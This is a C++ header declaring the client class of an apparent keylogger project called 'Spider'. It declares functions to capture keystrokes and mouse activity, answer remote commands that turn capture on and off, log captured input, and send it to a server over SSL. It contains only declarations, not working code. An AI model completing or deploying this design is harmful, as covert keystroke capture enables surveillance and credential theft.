#pragma once

#ifndef CLIENT_HPP_
# define CLIENT_HPP_

#include "stdafx.h"
#include <thread>
#include <unordered_map>
#include <fstream>

#include "Protocol.hpp"
#include "BoostNetwork.h"
#include "ControlData.hpp"
#include <mutex>


extern ControlData						*gControlData;
static const int						MAX_COMPUTERNAME = 1024;
static std::mutex							gMutex;

class																	Client
{	 
	typedef void				(Client::*fnctQ)();
	typedef	Spider::RequestCode	(Client::*r_fnct)(void);

private:					
	std::shared_ptr<INetwork>											_network;
	ControlData															_data;
	Status																_tmpState;
	int																	_code;

	SafeQueue<Spider::RequestCode>										_msgQ;
	std::unordered_map<Spider::RequestCode, fnctQ>						_sendListQ;
	std::unordered_map<Spider::RequestCode, r_fnct>						_requList;

	// SEND MEMEBER FUNCTIONS

	void							responseMouseEvent(const std::shared_ptr<IInput>& info);
	void							responseKeyEvent(const std::shared_ptr<IInput>& info);
	void							responseStatus();
	void							responseShutdown();
	void							responseClientId();
	void							response(Spider::RequestCode);

	// RECEIVE MEMBER FUNCTIONS

	Spider::RequestCode				requestPing();
	Spider::RequestCode				requestId();
	Spider::RequestCode				requestKbActivate();
	Spider::RequestCode				requestKbDeactivate();
	Spider::RequestCode				requestTrackActivate();
	Spider::RequestCode				requestTrackDeactivate();
	Spider::RequestCode				requestClickActivate();
	Spider::RequestCode				requestClickDeactivate();
	Spider::RequestCode				requestDisconnect();
	Spider::RequestCode				requestPauseActivate();
	Spider::RequestCode				requestPauseDeactivate();
	Spider::RequestCode				requestFrequency();
	Spider::RequestCode				requestStatus();

public:
	Client(const std::string& _port, const std::string& host, 
		boost::asio::io_service& socket,
		boost::asio::ssl::context &context);
	virtual ~Client() = default;

	
	/* SEND MESSAGE */
	static void		sendData(Client& c);
	void			getMessageQ();
	void			getMessage();
	void			getMessage(Spider::RequestCode code,
								const std::shared_ptr<IInput>& info);


	/* WRITE/READ IN LOG FILE */
	void			changeLog();
	void			readMessage();
	void			storeMessage(const std::shared_ptr<IInput>& info, Spider::RequestCode code);
	void			storeMessage(Spider::RequestCode code);
	bool			isFileEmpty();

	/* CONNECT TO SERVER */
	int				connectClient();
	bool			checkSafeQueue() { return (_data._keys.isEmpty()); }

	/* INITIATE KEYLOGGER*/

	static void			startHooking();
};

#endif // !CLIENT_HPP_